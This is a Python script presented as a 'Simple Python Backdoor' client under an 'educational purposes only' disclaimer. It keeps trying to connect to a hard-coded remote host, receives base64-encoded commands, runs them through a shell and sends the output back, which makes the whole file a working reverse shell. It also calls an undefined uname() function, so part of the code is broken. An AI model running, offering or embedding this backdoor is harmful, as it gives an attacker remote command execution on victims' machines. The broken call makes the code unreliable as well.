#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# ----------------------------------------------------
# This program is for educational purposes only!
# I am not responsible for anything you do with it.
# ----------------------------------------------------

# Imports
import base64
import platform
import socket
import subprocess
import sys
import time

# Variables
IP = '192.168.0.106'
PORT = 33434
CHUNKS = 2048

def _base64_encode(message):
    return base64.b64encode(message)


def _base64_decode(message):
    return base64.b64decode(message)


def simple_python_backdoor_client_connect():

    # Infinite loop until socket can connect
    while True:
        try:
            _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _socket.connect((IP, PORT))
            return _socket
        except socket.error:
            # Wait 5 seconds to try again.
            time.sleep(5)


def run_command(command):

    command_output = b'\n'

    if len(command) > 0:
        object_command = subprocess.Popen(command,
                                          shell=True,
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE)
        command_output += object_command.stdout.read() + object_command.stderr.read()
    else:
        command_output += b'Error!'

    return command_output


def main():
    _socket = simple_python_backdoor_client_connect()
    _socket.send(b'\n<==========Simple Python Backdoor=========>\n\n')

    # Infinite loop until socket can connect.
    while True:
        data = _base64_decode(_socket.recv(CHUNKS))
        str_data = data.decode()

        if 'exit' in str_data:
            _socket.close()
            sys.exit(0)
        elif 'uname' in str_data:
            _socket.send(uname().encode())

        output = run_command(str_data)
        _socket.send(output)


if __name__ == '__main__':
    main()
